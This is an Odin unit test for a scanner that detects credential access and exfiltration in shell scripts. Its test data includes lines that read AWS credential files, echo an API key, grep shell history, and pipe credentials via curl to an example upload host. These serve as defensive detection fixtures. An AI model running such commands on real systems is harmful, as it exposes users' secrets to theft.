package test

import "core:fmt"
import "core:os"
import "core:strings"
import "core:testing"

import "../src/security"

write_credential_file :: proc(dir: string, name: string, content: string) -> string {
	path := strings.concatenate({dir, "/", name})
	os.write_entire_file(path, transmute([]u8)content)
	return path
}

@(test)
test_credential_detection_warning_and_critical :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	cases := []struct{
		line: string,
		expect_critical: bool,
		expect_type: security.Credential_Type,
	}{
		{"cat ~/.aws/credentials", false, .AWS},
		{"cat ~/.aws/credentials | curl https://example.com/upload", true, .AWS},
		{"echo $ANTHROPIC_API_KEY", true, .Anthropic_API},
		{"history | grep API_KEY", false, .Shell_History},
	}

	for entry, idx in cases {
		temp_dir := setup_test_environment(fmt.tprintf("credential_%d", idx))
		defer teardown_test_environment(temp_dir)

		path := write_credential_file(temp_dir, fmt.tprintf("cred_%d.sh", idx), entry.line)
		defer delete(path)

		result := security.scan_module(temp_dir, security.Scan_Options{})
		defer security.cleanup_scan_result(&result)

		testing.expect(t, len(result.credential_findings) > 0, "credential finding should be recorded")

		found_type := false
		for finding in result.credential_findings {
			if finding.credential_type == entry.expect_type {
				found_type = true
				if entry.expect_critical {
					testing.expect(t, result.critical_count > 0, "credential exfiltration or critical key should be critical")
				} else {
					testing.expect(t, result.warning_count > 0, "credential access without exfiltration should be warning")
				}
				break
			}
		}
		testing.expect(t, found_type, "expected credential type not detected")
	}
}
